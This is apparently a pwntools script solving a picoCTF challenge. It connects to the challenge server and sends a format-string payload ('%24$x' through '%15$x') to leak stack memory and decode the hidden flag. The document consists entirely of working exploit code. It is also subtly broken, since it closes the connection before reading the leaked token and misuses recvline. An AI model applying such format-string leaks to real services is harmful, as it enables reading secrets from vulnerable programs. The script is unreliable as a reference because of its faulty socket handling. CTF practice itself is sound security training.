from pwn import *

host = 'mercury.picoctf.net'
port = 53437

def solve(s):
    s.recvuntil(b'portfolio\n')

    # select option: 1
    s.sendline(b'1')
    s.recvline(b'stonks\n')

    # construct format string argument
    # payload to test the index of argument
    # payload = '|'.join(f'{i}-%x' for i in range(40))

    # payload to actually get the flag
    payload = ''.join(f'%{i}$x' for i in range(24, 14, -1))
    s.sendline(payload)
    
    # recieve and print the flag
    s.recvuntil(b'token:\n')
    s.close()
    flag = int(s.recvline()[:-1], 16)
    flag = flag.to_bytes((flag.bit_length() + 7) // 8, 'little')
    print (flag[:flag.find(b'\x00')].decode())
    s.close()

if __name__ == '__main__':
    s = remote(host, port)
    solve(s)
    s.close()